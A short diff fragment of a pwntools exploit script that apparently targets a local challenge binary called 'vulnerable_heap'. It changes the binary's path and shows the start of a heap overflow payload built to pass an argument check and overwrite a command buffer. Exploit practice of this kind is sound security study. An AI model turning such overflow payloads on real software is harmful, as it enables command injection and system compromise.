@@ -3,7 +3,7 @@ from pwnlib.tubes.process import PTY
 
 context.log_level = 'debug'
 
-p = process('./vulnerable_heap', stdin=PTY, stdout=PTY)
+p = process('./vulnerable_heap/ELF_64/vulnerable_heap', stdin=PTY, stdout=PTY)
 
 payload  = b"\x00"            # makes arg look empty to checkArg/strcat
 payload += b"A" * (0x30 - 1)  # total 0x30 bytes to reach cmd
